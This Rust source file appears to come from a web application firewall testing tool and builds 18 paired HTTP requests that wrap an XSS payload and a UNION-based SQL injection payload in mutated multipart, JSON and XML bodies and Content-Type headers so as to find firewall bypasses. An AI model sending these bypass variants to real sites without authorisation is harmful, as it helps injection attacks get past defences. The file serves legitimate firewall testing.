//! Curated WAFFLED-inspired parser discrepancy cases.
//!
//! These requests keep the attack payload intact and mutate surrounding
//! content-type/body structure to surface candidate WAF bypasses caused by
//! parser discrepancies.

use std::collections::HashMap;

const MULTIPART_BOUNDARY: &str = "real-boundary";
const XSS_PAYLOAD: &str = "<script>alert(1)</script>";
const XML_SQLI_PAYLOAD: &str = "' UNION SELECT NULL--";

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CuratedRequest {
    pub method: String,
    pub headers: HashMap<String, String>,
    pub body: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CuratedDiscrepancyPair {
    pub name: String,
    pub canonical_class: String,
    pub content_type: String,
    pub payload_family: String,
    pub mutation_cost: u8,
    pub control_request: CuratedRequest,
    pub variant_request: CuratedRequest,
}

pub fn curated_parser_discrepancy_pairs(max_pairs: usize) -> Vec<CuratedDiscrepancyPair> {
    let all_pairs = vec![
        multipart_duplicate_boundary_parameter(),
        multipart_boundary_parameter_continuation(),
        multipart_quoted_boundary_value(),
        multipart_content_type_case_drift(),
        multipart_content_type_extra_parameter(),
        multipart_boundary_tailing_semicolon(),
        json_content_type_removed(),
        json_content_type_case_drift(),
        json_content_type_extra_parameter(),
        json_duplicate_keys(),
        json_array_wrapper(),
        json_content_type_charset_quoted(),
        xml_text_xml_alias(),
        xml_content_type_extra_parameter(),
        xml_namespace_wrapper(),
        xml_extra_field_addition(),
        xml_cdata_wrapper(),
        xml_doctype_preamble(),
    ];

    let max_pairs = max_pairs.min(all_pairs.len());
    all_pairs.into_iter().take(max_pairs).collect()
}

fn multipart_control_request() -> CuratedRequest {
    CuratedRequest {
        method: "POST".to_string(),
        headers: HashMap::from([(
            "Content-Type".to_string(),
            format!("multipart/form-data; boundary={MULTIPART_BOUNDARY}"),
        )]),
        body: format!(
            "--{MULTIPART_BOUNDARY}\r\nContent-Disposition: form-data; name=\"field1\"\r\n\r\n{XSS_PAYLOAD}\r\n--{MULTIPART_BOUNDARY}--\r\n"
        ),
    }
}

fn multipart_pair(
    name: &str,
    canonical_class: &str,
    mutation_cost: u8,
    content_type: &str,
) -> CuratedDiscrepancyPair {
    CuratedDiscrepancyPair {
        name: name.to_string(),
        canonical_class: canonical_class.to_string(),
        content_type: "multipart/form-data".to_string(),
        payload_family: "xss-multipart".to_string(),
        mutation_cost,
        control_request: multipart_control_request(),
        variant_request: CuratedRequest {
            method: "POST".to_string(),
            headers: HashMap::from([("Content-Type".to_string(), content_type.to_string())]),
            body: format!(
                "--{MULTIPART_BOUNDARY}\r\nContent-Disposition: form-data; name=\"field1\"\r\n\r\n{XSS_PAYLOAD}\r\n--{MULTIPART_BOUNDARY}--\r\n"
            ),
        },
    }
}

fn multipart_duplicate_boundary_parameter() -> CuratedDiscrepancyPair {
    multipart_pair(
        "Multipart Duplicate Boundary Parameter",
        "duplicate_boundary_parameter",
        1,
        &format!("multipart/form-data; boundary=fake-boundary; boundary={MULTIPART_BOUNDARY}"),
    )
}

fn multipart_boundary_parameter_continuation() -> CuratedDiscrepancyPair {
    multipart_pair(
        "Multipart Boundary Parameter Continuation",
        "boundary_parameter_continuation",
        2,
        "multipart/form-data; boundary=fake; boundary*0=real-; boundary*1=boundary",
    )
}

fn multipart_quoted_boundary_value() -> CuratedDiscrepancyPair {
    multipart_pair(
        "Multipart Quoted Boundary Value",
        "quoted_boundary_value",
        1,
        &format!("multipart/form-data; boundary=\"{MULTIPART_BOUNDARY}\""),
    )
}

fn multipart_content_type_case_drift() -> CuratedDiscrepancyPair {
    multipart_pair(
        "Multipart Content-Type Case Drift",
        "content_type_case_drift",
        1,
        &format!("Multipart/Form-Data; boundary={MULTIPART_BOUNDARY}"),
    )
}

fn multipart_content_type_extra_parameter() -> CuratedDiscrepancyPair {
    multipart_pair(
        "Multipart Content-Type Extra Parameter",
        "content_type_extra_parameter",
        2,
        &format!("multipart/form-data; boundary={MULTIPART_BOUNDARY}; charset=UTF-8; foo=bar"),
    )
}

fn multipart_boundary_tailing_semicolon() -> CuratedDiscrepancyPair {
    multipart_pair(
        "Multipart Boundary Tailing Semicolon",
        "boundary_tailing_semicolon",
        1,
        &format!("multipart/form-data; boundary={MULTIPART_BOUNDARY};"),
    )
}

fn json_control_request() -> CuratedRequest {
    CuratedRequest {
        method: "POST".to_string(),
        headers: HashMap::from([("Content-Type".to_string(), "application/json".to_string())]),
        body: format!(r#"{{"field1":"{XSS_PAYLOAD}"}}"#),
    }
}

fn json_pair(
    name: &str,
    canonical_class: &str,
    mutation_cost: u8,
    headers: HashMap<String, String>,
    body: String,
) -> CuratedDiscrepancyPair {
    CuratedDiscrepancyPair {
        name: name.to_string(),
        canonical_class: canonical_class.to_string(),
        content_type: "application/json".to_string(),
        payload_family: "xss-json".to_string(),
        mutation_cost,
        control_request: json_control_request(),
        variant_request: CuratedRequest {
            method: "POST".to_string(),
            headers,
            body,
        },
    }
}

fn json_content_type_removed() -> CuratedDiscrepancyPair {
    json_pair(
        "JSON Content-Type Removed",
        "content_type_removed",
        1,
        HashMap::new(),
        format!(r#"{{"field1":"{XSS_PAYLOAD}"}}"#),
    )
}

fn json_content_type_case_drift() -> CuratedDiscrepancyPair {
    json_pair(
        "JSON Content-Type Case Drift",
        "content_type_case_drift",
        1,
        HashMap::from([("Content-Type".to_string(), "Application/Json".to_string())]),
        format!(r#"{{"field1":"{XSS_PAYLOAD}"}}"#),
    )
}

fn json_content_type_extra_parameter() -> CuratedDiscrepancyPair {
    json_pair(
        "JSON Content-Type Extra Parameter",
        "content_type_extra_parameter",
        2,
        HashMap::from([(
            "Content-Type".to_string(),
            r#"application/json; profile="waffled""#.to_string(),
        )]),
        format!(r#"{{"field1":"{XSS_PAYLOAD}"}}"#),
    )
}

fn json_duplicate_keys() -> CuratedDiscrepancyPair {
    json_pair(
        "JSON Duplicate Keys",
        "duplicate_json_keys",
        2,
        HashMap::from([("Content-Type".to_string(), "application/json".to_string())]),
        format!(r#"{{"field1":"safe","field1":"{XSS_PAYLOAD}"}}"#),
    )
}

fn json_array_wrapper() -> CuratedDiscrepancyPair {
    json_pair(
        "JSON Array Wrapper",
        "field_array_wrapper",
        1,
        HashMap::from([("Content-Type".to_string(), "application/json".to_string())]),
        format!(r#"{{"field1":["{XSS_PAYLOAD}"]}}"#),
    )
}

fn json_content_type_charset_quoted() -> CuratedDiscrepancyPair {
    json_pair(
        "JSON Content-Type Charset Quoted",
        "content_type_charset_quoted",
        2,
        HashMap::from([(
            "Content-Type".to_string(),
            r#"application/json; charset="utf-8""#.to_string(),
        )]),
        format!(r#"{{"field1":"{XSS_PAYLOAD}"}}"#),
    )
}

fn xml_control_request() -> CuratedRequest {
    CuratedRequest {
        method: "POST".to_string(),
        headers: HashMap::from([("Content-Type".to_string(), "application/xml".to_string())]),
        body: format!(r#"<?xml version="1.0"?><root><field1>{XML_SQLI_PAYLOAD}</field1></root>"#),
    }
}

fn xml_pair(
    name: &str,
    canonical_class: &str,
    mutation_cost: u8,
    headers: HashMap<String, String>,
    body: String,
) -> CuratedDiscrepancyPair {
    CuratedDiscrepancyPair {
        name: name.to_string(),
        canonical_class: canonical_class.to_string(),
        content_type: "application/xml".to_string(),
        payload_family: "sqli-xml-text".to_string(),
        mutation_cost,
        control_request: xml_control_request(),
        variant_request: CuratedRequest {
            method: "POST".to_string(),
            headers,
            body,
        },
    }
}

fn xml_text_xml_alias() -> CuratedDiscrepancyPair {
    xml_pair(
        "XML text/xml Alias",
        "text_xml_alias",
        1,
        HashMap::from([("Content-Type".to_string(), "text/xml".to_string())]),
        format!(r#"<?xml version="1.0"?><root><field1>{XML_SQLI_PAYLOAD}</field1></root>"#),
    )
}

fn xml_content_type_extra_parameter() -> CuratedDiscrepancyPair {
    xml_pair(
        "XML Content-Type Extra Parameter",
        "content_type_extra_parameter",
        2,
        HashMap::from([(
            "Content-Type".to_string(),
            "application/xml; charset=UTF-8; foo=bar".to_string(),
        )]),
        format!(r#"<?xml version="1.0"?><root><field1>{XML_SQLI_PAYLOAD}</field1></root>"#),
    )
}

fn xml_namespace_wrapper() -> CuratedDiscrepancyPair {
    xml_pair(
        "XML Namespace Wrapper",
        "namespace_wrapper",
        1,
        HashMap::from([("Content-Type".to_string(), "application/xml".to_string())]),
        format!(
            r#"<?xml version="1.0"?><ns:root xmlns:ns="urn:waffled"><ns:field1>{XML_SQLI_PAYLOAD}</ns:field1></ns:root>"#
        ),
    )
}

fn xml_extra_field_addition() -> CuratedDiscrepancyPair {
    xml_pair(
        "XML Extra Field Addition",
        "extra_field_addition",
        2,
        HashMap::from([("Content-Type".to_string(), "application/xml".to_string())]),
        format!(
            r#"<?xml version="1.0"?><root><field0>safe</field0><field1>{XML_SQLI_PAYLOAD}</field1></root>"#
        ),
    )
}

fn xml_cdata_wrapper() -> CuratedDiscrepancyPair {
    xml_pair(
        "XML CDATA Wrapper",
        "cdata_wrapper",
        1,
        HashMap::from([("Content-Type".to_string(), "application/xml".to_string())]),
        format!(
            r#"<?xml version="1.0"?><root><field1><![CDATA[{XML_SQLI_PAYLOAD}]]></field1></root>"#
        ),
    )
}

fn xml_doctype_preamble() -> CuratedDiscrepancyPair {
    xml_pair(
        "XML DOCTYPE Preamble",
        "doctype_preamble",
        2,
        HashMap::from([("Content-Type".to_string(), "application/xml".to_string())]),
        format!(
            r#"<?xml version="1.0"?><!DOCTYPE root [<!ELEMENT root ANY>]><root><field1>{XML_SQLI_PAYLOAD}</field1></root>"#
        ),
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_curated_pairs_default_distribution() {
        let pairs = curated_parser_discrepancy_pairs(18);
        assert_eq!(pairs.len(), 18);

        let multipart = pairs
            .iter()
            .filter(|pair| pair.content_type == "multipart/form-data")
            .count();
        let json = pairs
            .iter()
            .filter(|pair| pair.content_type == "application/json")
            .count();
        let xml = pairs
            .iter()
            .filter(|pair| pair.content_type == "application/xml")
            .count();

        assert_eq!(multipart, 6);
        assert_eq!(json, 6);
        assert_eq!(xml, 6);
    }

    #[test]
    fn test_curated_pairs_respect_max_pairs() {
        let pairs = curated_parser_discrepancy_pairs(5);
        assert_eq!(pairs.len(), 5);
        assert!(pairs
            .iter()
            .all(|pair| pair.control_request.method == "POST"));
        assert!(pairs
            .iter()
            .all(|pair| pair.variant_request.method == "POST"));
    }

    #[test]
    fn test_curated_pairs_have_stable_metadata() {
        let pairs = curated_parser_discrepancy_pairs(18);
        assert!(pairs.iter().all(|pair| !pair.name.is_empty()));
        assert!(pairs.iter().all(|pair| !pair.canonical_class.is_empty()));
        assert!(pairs.iter().all(|pair| !pair.payload_family.is_empty()));
        assert!(pairs.iter().all(|pair| pair.mutation_cost > 0));
        assert!(pairs.iter().all(
            |pair| pair.control_request.body != pair.variant_request.body
                || pair.control_request.headers != pair.variant_request.headers
        ));
    }
}
